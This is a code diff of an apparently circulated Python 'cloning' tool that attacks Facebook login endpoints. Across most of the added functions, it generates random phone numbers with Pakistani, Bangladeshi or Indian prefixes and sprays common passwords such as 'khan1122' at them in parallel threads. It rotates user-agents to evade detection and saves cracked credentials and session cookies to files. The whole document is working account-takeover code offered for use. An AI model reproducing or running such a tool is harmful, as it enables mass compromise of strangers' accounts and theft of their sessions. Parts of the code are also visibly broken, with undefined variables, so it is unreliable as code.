@@ -1,4 +1,79 @@
+#coding=utf-8
+#!/usr/bin/python3
+"""
+hello friends kese ho this is mr.Aftab
+to i hope ap sab thik honge 
+ajkal facebook ke sc ke ander method change krne ki zrorat ni
+q ke en 3 mounth se facebook ke ander m.basic chalta hai
+like facrbook ke all method again working bas 1 kam krna phrta hai
+Fresh user ugent kahi se dhondo or eske userugent change krlo
+then uske bad sc full lush hoga.
+agar kisi ko userugent ni milte muj se contact krlo mai deta hon
+Facebook acount name :- M R Aftab
+thanks :- allah hafiz
+"""
+#new userugrnt u can use this-----#
+"""
+Dalvik/2.1.0 (Linux; U; Android 8.1.0; LM-X415S Build/OPM1.171019.026)
 
+  Dalvik/2.1.0 (Linux; U; Android 11; AQUOS-TVX21B Build/RTM5.220609.268)
+
+  Dalvik/2.1.0 (Linux; U; Android 14; 21121210G Build/UKQ1.230917.001)
+
+  Dalvik/2.1.0 (Linux; U; Android 9; HiDPTAndroid Hi3751V560 Build/PPR1.180610.011)
+
+  Dalvik/2.1.0 (Linux; U; Android 11; NSTV FF Build/RTT2.220103.001)
+
+  Dalvik/2.1.0 (Linux; U; Android 9.0; HTZM-10 Build/O00623)
+
+  Dalvik/2.1.0 (Linux; U; Android 9; 8A001_A3 Build/PPR1.180610.011)
+
+  Dalvik/2.1.0 (Linux; U; Android 10.0; x96 Lite Build/QP1A.191105.004)
+
+  Dalvik/2.1.0 (Linux; U; Android 12; XS97 R3 Build/QP1A.191105.004)
+
+  Dalvik/2.1.0 (Linux; U; Android 11; Xiaomi Watch 2 Pro Build/RWS2.221020.001.XM182.REL)
+
+  Dalvik/2.1.0 (Linux; U; Android 14; Pixel 7 Build/AP21.240119.009)
+
+  Dalvik/2.1.0 (Linux; U; Android 12.0; Q96MAX Build/NHG47L)
+
+  Dalvik/2.1.0 (Linux; U; Android 12; MI 8 Build/SQ3A.220705.004)
+
+  Dalvik/2.1.0 (Linux; U; Android 12; SmartT23 Build/SP1A.210812.016)
+
+  Dalvik/2.1.0 (Linux; U; Android 13; T609L Build/TP1A.220624.014)
+
+  Dalvik/2.1.0 (Linux; U; Android 11; moto g stylus (2022) Build/RRDES31.Q3-73-22-17)
+
+  Dalvik/2.1.0 (Linux; U; Android 12; SMART_TV Build/SP1A.210812.016)
+
+  Dalvik/2.1.0 (Linux; U; Android 10; moto e(7) plus Build/QPZ30.30-Q3-38-25)
+
+  Dalvik/2.1.0 (Linux; U; Android 14; 22041219NY Build/UP1A.231005.007)
+
+  Dalvik/2.1.0 (Linux; U; Android 12; myPhone Jet Build/SP1A.210812.016)
+  
+  Dalvik/2.1.0 (Linux; U; Android 11; SGP321 Build/RQ3A.210805.019)
+
+  Dalvik/2.1.0 (Linux; U; Android 13; SGP321 Build/TD1A.220804.021)
+
+  Dalvik/2.1.0 (Linux; U; Android 10; SGP321 Build/QQ1B.191205.042)
+
+  Dalvik/2.1.0 (Linux; U; Android 13; SGP321 Build/TD1A.220804.039)
+
+  Dalvik/2.1.0 (Linux; U; Android 12; SGP321 Build/SQ3A.220705.018)
+
+  Dalvik/2.1.0 (Linux; U; Android 10; SGP321 Build/QQ2A.200501.007)
+
+  Dalvik/2.1.0 (Linux; U; Android 10; SGP321 Build/QP1A.190711.044)
+
+  Dalvik/2.1.0 (Linux; U; Android 10; SGP321 Build/QQ1A.200105.047)
+
+  Dalvik/2.1.0 (Linux; U; Android 11; SGP321 Build/RP1A.201005.003)
+
+  Dalvik/2.1.0 (Linux; U; Android 10; SGP321 Build/QD4A.200805.014)
+"""
 #-----
 import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,platform,base64
 from random import randint
@@ -62,7 +137,7 @@ _silet_koceng_  = requests.Session()
 url_mb = "https://mbasic.facebook.com"
 bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
 bulan_key = {"january": "January", "february": "February", "march": "March", "april": "April", "may": "May", "june": "June", "july": "July", "august": "August", "september": "September", "october": "October", "november": "November", "december": "December"}
-header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/317.0.0.12.104;]"}
+header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 11; SM-A022G Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/317.0.0.12.104;]"}
 P = '\x1b[1;97m' # PUTIH
 M = '\033[0;91m' # MERAH 
 H = '\033[1;92m' # HIJAU 
@@ -99,7 +174,7 @@ loop = 0
 url_lookup = "https://lookup-id.com/"
 url_mb = "https://m.facebook.com"
 url_ip = "https://www.httpbin.org/ip"
-header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/317.0.0.12.104;]"}
+header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 11; SM-A022G Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/317.0.0.12.104;]"}
 bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
 done = False
 ###
@@ -230,18 +305,20 @@ def clear():
 	#
 def menu():
 	clear()
-	print('[1] FILE CLONING AUTO PASS  ')
-	print('[2] FILE CLONING CHOICE PASS ')
+	print('[1] File Cloning Auto  Pass  ')
+	print('[2] File Cloning Choice Pass ')
+	print('[3] Random number Cloning')
+	print('[4] File Create ')
 	print('[5] Exit')
 	linex()
-	BLAZE=input('[•] Select Option :')
-	if BLAZE =='1':
+	Aftab=input('[•] Select Option :')
+	if Aftab =='1':
 		__crack__().plerr()
-	if BLAZE =='2':
+	if Aftab =='2':
 		file()
-	if BLAZE =='3':
+	if Aftab =='3':
 		mrAftab()
-	if BLAZE =='4':
+	if Aftab =='4':
 		print('[•] For this scrpit contact with me');exit()
 	else:
 		print('[•] Select Right Option ');menu()
@@ -282,7 +359,7 @@ class __crack__:
             try:
                 Adiagents = random.choice(liners)
             except (KeyError, IOError):
-                Adiagents  = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 [FBAN/EMA;FBLC/en_GB;FBAV/386.0.0.13.96;]'
+                Adiagents  = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_GB;FBAV/386.0.0.13.96;]'
             ses = requests.Session()
             headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 8.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.2861.97 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
             p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
@@ -290,16 +367,16 @@ class __crack__:
             _headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 3.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.2707.112 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
             po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
             if 'c_user' in ses.cookies.get_dict():
-                print('\r\033[1;32m [BLAZE-Ok]\033[1;32m %s | %s      ' % (user,pw))
+                print('\r\033[1;32m [AFTAB-Ok]\033[1;32m %s | %s      ' % (user,pw))
                 wrt = '%s - %s' % (user,pw)
                 ok.append(wrt)
-                open('BLAZE-Ok.txt','a').write('%s\n' % wrt)
+                open('AFTAB-Ok.txt','a').write('%s\n' % wrt)
                 break
             elif 'checkpoint' in ses.cookies.get_dict():
-                print('\r\033[1;31m [BLAZE-CP]\033[1;31m %s | %s      ' % (user,pw))
+                print('\r\033[1;31m [AFTAB-CP]\033[1;31m %s | %s      ' % (user,pw))
                 wrt = '%s - %s' % (user,pw)
                 ok.append(wrt)
-                open('BLAZE-CP.txt','a').write('%s\n' % wrt)
+                open('AFTAB-CP.txt','a').write('%s\n' % wrt)
                 break
             else:
                 continue
@@ -320,7 +397,7 @@ class __crack__:
             time.sleep(1)
             
             print('[•] Total Ids : %s ' % len(self.id))
-            print('\x1b[1;91m[•] USE FLIGHT MODE FOR MORE ID')
+            print('\x1b[1;91m[•] If you no result use ✈️ ✈️ flight mode ✈️ ✈️')
             linex()
             with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
                 for yntkts in self.id:
@@ -346,9 +423,12 @@ class __crack__:
             print('\n××××')
             time.sleep(1)
             self.__pler__()
-            exit()
+            
 
-  logo="""
+            
+    
+
+logo="""
         \033[1;36md8888  .d888 888             888      
        \033[1;36md88888 d88P"  888             888      
       \033[1;36md88P888 888    888             888      
@@ -356,14 +436,17 @@ class __crack__:
     \033[1;36md88P  888 888    888        "88b 888 "88b 
    \033[1;36md88P   888 888    888    .d888888 888  888 
   \033[1;36md8888888888 888    Y88b.  888  888 888 d88P 
- \033[1;36md88P     888 888     "Y888 "Y888888 88888P"    
-                                                             
-\033[1;37m--------------------- \033[1;35m \033[1;37m---------------------
+ \033[1;36md88P     888 888     "Y888 "Y888888 88888P"  
+                                             
+                            
+\033[1;37m--------------------- \033[1;35mAk \033[1;37m---------------------
 
-\033[1;36→ OWNER   :RAZU HEROO\033[1;36 
-\033[1;36→ FACEBOOK:
-\033[1;36→ TOOL TYPE:FREE
-\033[1;36→ VERSION :0.1
+\033[1;32m→   Owner   :            Aftab \033[1;36m𓆩♡𓆪
+\033[1;32m→   Facebook:            Aftab khan
+\033[1;32m→  Tool Type:            \033[1;31mPaid  
+\033[1;32m→   Github  :            Private ha yaar
+\033[1;32m→   Version :            1.3
+
 \33[1;37m----------------------------------------------"""
 def linex():
 	print('\33[1;37m----------------------------------------------')
@@ -551,7 +634,7 @@ url_ip = "https://www.httpbin.org/ip"
 
 url_graph = "https://graph.facebook.com/{}"
 
-header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
+header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
 
 bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
 
@@ -776,7 +859,336 @@ loop = 0
 Apk = []
 oks = []
 cps = []
-	
+				
+def mrAftab():
+	os.system('clear')
+	print(logo)
+	print('[1] Pak Random Cloning ')
+	print('[2] B D Random Cloning  ')
+	print('[3] Choice Pass Cloning')
+	print('\x1b[1;91m[4]  Exit Programe')
+	linex()
+	Aftab=input(' Select option : ')
+	if Aftab =='1':
+		Aftab1()
+	if Aftab =='2':
+		Aftab2()
+	if Aftab =='4':
+		exit()
+	if Aftab =='3':
+		choice()
+	if Aftab =='5':
+		exit()
+def Aftab2():
+	os.system('clear')
+	print(logo)
+	print('[1] Bangla Random Cloning')
+	print('[2] India Random Cloning')
+	print('\x1b[1;91m[3] Go to main menu')
+	linex()
+	Aftab=input(' Select option : ')
+	if Aftab =='1':
+		bd()
+	if Aftab =='2':
+		india()
+	if Aftab =='3':
+		menu()
+def Aftab1():
+	os.system('clear')
+	print(logo)
+	print('[1] Random Cloning M [1] ')
+	print('[2] Random Cloning M [2] ')
+	print('[3] Random Cloning M [3] ')
+	print('[4] Random Cloning M [4] ')
+	print('[5] Random Cloning M [5]  ')
+	print('\x1b[1;91m[6] Go to main menu')
+	linex()
+	Aftab=input(' Select option : ')
+	if Aftab =='1':
+		m1()
+	if Aftab =='2':
+		m2()
+	if Aftab =='3':
+		m3()
+	if Aftab =='4':
+		m4()
+	if Aftab =='5':
+		m5()
+	if Aftab =='6':
+		menu()
+def m1():
+	uid=[]
+	os.system('clear')
+	print(logo)
+	print('\033[1;31m[•] NOT : PUT 92306,92304,92317 etc')
+	linex()
+	kode = input('[+]\033[1;37m Your Code : ')
+	os.system('clear')
+	print(logo)
+	print('[•] Example : 1000,5000,100000,*****Etc ')
+	linex()
+	limit = int(input('[•] Your Idz lemit :  '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		uid.append(nmp)
+	with ThreadPool(max_workers=65) as yaari:
+		os.system('clear')
+		print(logo)
+		tl = str(len(uid))
+		print('[•] Total Acounts : '+tl)
+		print('[•] Selected Code : \x1b[1;92m'+kode)
+		print('\x1b[1;91m[•] If you no result use ✈️ ✈️ flight mode ✈️ ✈️')
+		linex()
+		for guru in uid:
+			uid = kode+guru
+			pwx = [guru]
+			yaari.submit(rcrack,uid,pwx,tl)
+	linex()
+	print('Crack process has been completed')
+	print('Ids saved in ok.txt,cp.txt')
+	linex()
+	exit()
+def m2():
+	uid=[]
+	os.system('clear')
+	print(logo)
+	print('\033[1;31m[•] NOT : PUT 92306,92304,92317 etc')
+	linex()
+	kode = input('[+]\033[1;37m Your Code : ')
+	os.system('clear')
+	print(logo)
+	print('[•] Example : 1000,5000,100000,*****Etc ')
+	linex()
+	limit = int(input('[•] Your Idz lemit :  '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		uid.append(nmp)
+	with ThreadPool(max_workers=65) as yaari:
+		os.system('clear')
+		print(logo)
+		tl = str(len(uid))
+		print('[•] Total Acounts : '+tl)
+		print('[•] Selected Code : \x1b[1;92m'+kode)
+		print('\x1b[1;91m[•] If you no result use ✈️ ✈️ flight mode ✈️ ✈️')
+		linex()
+		for guru in uid:
+			uid = kode+guru
+			pwx = [guru,kode+guru,'khan1122']
+			yaari.submit(rcrack,uid,pwx,tl)
+	linex()
+	print('Crack process has been completed')
+	print('Ids saved in ok.txt,cp.txt')
+	linex()
+	exit()
+def m3():
+	uid=[]
+	os.system('clear')
+	print(logo)
+	print('\033[1;31m[•] NOT : PUT 92306,92304,92317 etc')
+	linex()
+	kode = input('[+]\033[1;37m Your Code : ')
+	os.system('clear')
+	print(logo)
+	print('[•] Example : 1000,5000,100000,*****Etc ')
+	linex()
+	limit = int(input('[•] Your Idz lemit :  '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		uid.append(nmp)
+	with ThreadPool(max_workers=65) as yaari:
+		os.system('clear')
+		print(logo)
+		tl = str(len(uid))
+		print('[•] Total Acounts : '+tl)
+		print('[•] Selected Code : \x1b[1;92m'+kode)
+		print('\x1b[1;91m[•] If you no result use ✈️ ✈️ flight mode ✈️ ✈️')
+		linex()
+		for guru in uid:
+			uid = kode+guru
+			pwx = [guru+kode,'khan12','khan1122','khan12345','khan123']
+			yaari.submit(rcrack,uid,pwx,tl)
+	linex()
+	print('Crack process has been completed')
+	print('Ids saved in ok.txt,cp.txt')
+	linex()
+	exit()
+def m4():
+	uid=[]
+	os.system('clear')
+	print(logo)
+	print('\033[1;31m[•] NOT : PUT 92306,92304,92317 etc')
+	linex()
+	kode = input('[+]\033[1;37m Your Code : ')
+	os.system('clear')
+	print(logo)
+	print('[•] Example : 1000,5000,100000,*****Etc ')
+	linex()
+	limit = int(input('[•] Your Idz lemit :  '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		uid.append(nmp)
+	with ThreadPool(max_workers=65) as yaari:
+		os.system('clear')
+		print(logo)
+		tl = str(len(uid))
+		print('[•] Total Acounts : '+tl)
+		print('[•] Selected Code : \x1b[1;92m'+kode)
+		print('\x1b[1;91m[•] If you no result use ✈️ ✈️ flight mode ✈️ ✈️')
+		linex()
+		for guru in uid:
+			uid = kode+guru
+			pwx = [guru,'khan786','khan12345','khan123','khan1234','khan1122','janjan']
+			yaari.submit(rcrack,uid,pwx,tl)
+	linex()
+	print('Crack process has been completed')
+	print('Ids saved in ok.txt,cp.txt')
+	linex()
+	exit()
+def m5():
+	uid=[]
+	os.system('clear')
+	print(logo)
+	print('\033[1;31m[•] NOT : PUT 92306,92304,92317 etc')
+	linex()
+	kode = input('[+]\033[1;37m Your Code : ')
+	os.system('clear')
+	print(logo)
+	print('[•] Example : 1000,5000,100000,*****Etc ')
+	linex()
+	limit = int(input('[•] Your Idz lemit :  '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		uid.append(nmp)
+	with ThreadPool(max_workers=65) as yaari:
+		os.system('clear')
+		print(logo)
+		tl = str(len(uid))
+		print('[•] Total Acounts : '+tl)
+		print('[•] Selected Code : \x1b[1;92m'+kode)
+		print('\x1b[1;91m[•] If you no result use ✈️ ✈️ flight mode ✈️ ✈️')
+		linex()
+		for guru in uid:
+			uid = kode+guru
+			pwx = [guru,'baloch','malik786','baloch123','khan12345','khan123','afghan123','pubg123']
+			yaari.submit(rcrack,uid,pwx,tl)
+	linex()
+	print('Crack process has been completed')
+	print('Ids saved in ok.txt,cp.txt')
+	linex()
+	exit()
+
+#___xhoice pass____
+def choice():
+    uid=[]
+    twf =[]
+    os.getuid
+    os.geteuid
+    os.system("clear")
+    print(logo)
+    print('\033[1;31m[•] NOT : PUT 92306,92304,92317 etc')
+    linex()
+    code = input('[•] PUT CODE : ')
+    os.system('clear')
+    print(logo)
+    print('[•] Example : 1000,5000,100000,*****Etc ')
+    linex()
+    limit = int(input('[•] Your Idz lemit :  '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        uid.append(nmp)
+    os.system("clear")
+    print(logo)
+    print('[•] Example : 1/ 2/ 3/ 4/ 5/ 6/ 7/ 8/ 9**ETC ')
+    linex()
+    passx = int(input("[•] Enter Password Limit : "))
+    PROID = []
+    os.system('clear')
+    print(logo)
+    print('[•] Example : khankhan,baloch,khan786,mlik786**Etc')
+    linex()
+    for Aftab in range(passx):
+        pww = input(f"[•] Enter Password {Aftab+1} : ")
+        mrAftab.append(pww)
+    with ThreadPool(max_workers=50) as yaari: 	        
+        os.system('clear')
+        print(logo)
+        tl = str(len(uid))
+        print('[•] Total Acounts : '+tl)
+        print('[•] Selected Code : \x1b[1;92m'+code)
+        print('\x1b[1;91m[•] If you no result use ✈️ ✈️ flight mode ✈️ ✈️')
+        linex()
+        for love in uid:
+            pwx = [love[1:]]
+            uid = code+love
+            for PRO in mrAftab:
+                pwx.append(PRO)
+                pwx.append(love)
+            yaari.submit(rcrack,uid,pwx,tl)
+#_______
+def india():
+	uid=[]
+	os.system('clear')
+	print(logo)
+	print('\033[1;31m[•] NOT : PUT 977,978,990,663,667,778 etc')
+	linex()
+	kode = input('\033[1;37m[•] Put  Your Country Code: ')
+	os.system('clear')
+	print(logo)
+	limit = int(input('[+] Your Idz lemit : '))
+	linex()
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		uid.append(nmp)
+	with ThreadPool(max_workers=65) as yaari:
+		os.system('clear')
+		print(logo)
+		tl = str(len(uid))
+		print('[•] Total Acounts : '+tl)
+		print('[•] Selected Code : \x1b[1;92m'+code)
+		print('\x1b[1;91m[•] If you no result use ✈️ ✈️ flight mode ✈️ ✈️')
+		linex()
+		for guru in uid:
+			uid = '+91'+kode+guru
+			aj = uid[0:6]
+			aja = uid[0:8]
+			pwx = [guru,kode+guru,aj,aja]
+			yaari.submit(rcrack,uid,pwx,tl)
+	print(50*'-')
+	print('Crack process has been completed')
+	print('Ids saved in ok.txt,cp.txt')
+	print(47*'-')
+	facebookweb()
+def bd():
+	uid=[]
+	os.system('clear')
+	print(logo)
+	print('\033[1;31m[•] NOT : PUT 130,131,141etc')
+	linex()
+	kode = input('[+]\033[1;36m Put  Your Country Code: ')
+	os.system('clear')
+	print(logo)
+	limit = int(input('[+] Your Idz lemit : '))
+	linex()
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		uid.append(nmp)
+	with ThreadPool(max_workers=65) as yaari:
+		os.system('clear')
+		print(logo)
+		tl = str(len(uid))
+		print('[•] Total Acounts : '+tl)
+		print('[•] Selected Code : \x1b[1;92m'+code)
+		print('\x1b[1;91m[•] If you no result use ✈️ ✈️ flight mode ✈️ ✈️')
+		linex()
+		for guru in uid:
+			uid = '+880'+kode+guru
+			pwx = [guru,kode+guru]
+			yaari.submit(rcrack,uid,pwx,tl)
+	print(50*'-')
+	print('Crack process has been completed')
+	print('Ids saved in ok.txt,cp.txt')
+	print(47*'-')
+	facebookweb()
 def rcrack(uid,pwx,tl):
 	#print(uid)
 	global loop
@@ -813,21 +1225,21 @@ def rcrack(uid,pwx,tl):
 			'sec-fetch-mode': 'navigate',
 			'sec-fetch-site': 'same-origin',
 			'upgrade-insecure-requests': '1',
-			'user-agent': "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/de_DE;FBAV/319.0.0.7.107;][FBAN/EMA;FBLC/de_DE;FBAV/319.0.0.7.107;]"}
+			'user-agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/de_DE;FBAV/319.0.0.7.107;][FBAN/EMA;FBLC/de_DE;FBAV/319.0.0.7.107;]"}
 			lo = session.post('https://x.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
-				print('\033[1;92m[BLAZE-Ok] '+cid+' | '+ps+'\n\033[0;92m[•] COOKIES : '+coki+'\x1b[1;97m')
+				print('\033[1;92m[AFTAB-Ok] '+cid+' | '+ps+'\n\033[0;92m[•] COOKIES : '+coki+'\x1b[1;97m')
 				open('ok.txt', 'a').write(uid+' | '+ps+'\n')
 				oks.append(cid)
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[141:156]
-				print('\033[1;96m[BLAZE-CP] '+cid+' | '+ps+'\033[0;97m')
+				print('\033[1;96m[AFTAB-CP] '+cid+' | '+ps+'\033[0;97m')
 				open('cp.txt', 'a').write(uid+' | '+ps+'\n')
 				cps.append(cid)
 				break
@@ -946,6 +1358,85 @@ def file():
 
 
 
+
+
+####
+"""
+Mozilla/5.0 (Linux; arm_64; Android 11; CPH2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5785.118 Mobile Safari/537.36
+Mozilla/5.0 (Linux; arm_64; Android 10; CPH2205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5703.109 Mobile Safari/537.36
+Mozilla/5.0 (Linux; arm_64; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.58<anyDigit>5.117 Mobile Safari/537.36
+Mozilla/5.0 (Linux; arm_64; Android 11; Mi Note 10 Lite) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5800.70 Mobile Safari/537.36
+Mozilla/5.0 (Linux; arm_64; Android 10; Xenium S266) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 YaBrowser/21.5.0.350.00 SA/3 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5025.103 Safari/537.36
+Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
+Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
+Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17
+Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
+Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
+Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4
+Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53
+Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
+Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFASWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36
+Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H321 Safari/600.1.4
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
+Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4
+Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko
+Mozilla/5.0 (Linux; U; Android 4.0.4; en-us; KFJWI Build/IMM76D) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36
+Mozilla/5.0 (iPad; CPU OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/9537.53
+Mozilla/5.0 (X11; CrOS armv7l 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
